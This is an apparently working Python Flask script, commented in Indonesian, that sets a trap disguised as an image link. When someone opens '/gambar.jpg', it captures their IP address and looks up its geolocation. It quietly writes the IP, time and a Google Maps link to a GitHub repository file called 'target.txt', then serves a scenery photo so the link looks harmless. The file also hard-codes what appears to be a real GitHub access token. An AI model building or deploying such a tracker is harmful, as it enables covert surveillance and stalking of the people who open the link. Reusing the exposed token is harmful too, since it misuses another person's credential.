from flask import Flask, request, send_file
import requests
from github import Github
from datetime import datetime

app = Flask(__name__)

# --- Konfigurasi ---
GITHUB_TOKEN = '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' # Silakan paste token Anda di sini
REPO_NAME = 'ODline/log-lokasi'                # Sudah disesuaikan dengan repo Anda
FILE_PATH = 'target.txt'                       # File tempat menyimpan log
GAMBAR_ASLI = 'pemandangan.jpg'                # Pastikan file gambar ini ada di folder yang sama

def kirim_ke_github(ip, maps_link):
    try:
        g = Github(GITHUB_TOKEN)
        repo = g.get_repo(REPO_NAME)
        waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_baru = f"Waktu: {waktu} | IP: {ip} | Lokasi: {maps_link}\n"
        
        # Ambil konten file lama dari GitHub untuk ditambahkan log baru
        file_contents = repo.get_contents(FILE_PATH)
        konten_lama = file_contents.decoded_content.decode("utf-8")
        konten_update = konten_lama + log_baru
        
        # Update file di repositori GitHub
        repo.update_file(
            file_contents.path, 
            f"Log IP baru tercatat", 
            konten_update, 
            file_contents.sha
        )
    except Exception as e:
        print(f"Gagal mengirim ke GitHub: {e}")

@app.route('/gambar.jpg')
def jebakan_gambar():
    # 1. Tangkap Alamat IP Target
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        ip_target = request.environ['REMOTE_ADDR']
    else:
        ip_target = request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0]

    # 2. Dapatkan Geolokasi dari IP
    maps_link = "Lokasi tidak dapat dilacak"
    try:
        # Menggunakan API gratis ipapi.co untuk mendapatkan koordinat
        geo_response = requests.get(f'https://ipapi.co/{ip_target}/json/').json()
        if 'latitude' in geo_response and 'longitude' in geo_response:
            lat = geo_response['latitude']
            lon = geo_response['longitude']
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    except Exception as e:
        print(f"Gagal melacak lokasi IP: {e}")

    # 3. Kirim Data ke GitHub secara senyap
    kirim_ke_github(ip_target, maps_link)

    # 4. Tampilkan gambar agar terlihat seperti tautan media biasa
    return send_file(GAMBAR_ASLI, mimetype='image/jpeg')

if __name__ == '__main__':
    # Jalankan server
    app.run(host='0.0.0.0', port=5000)
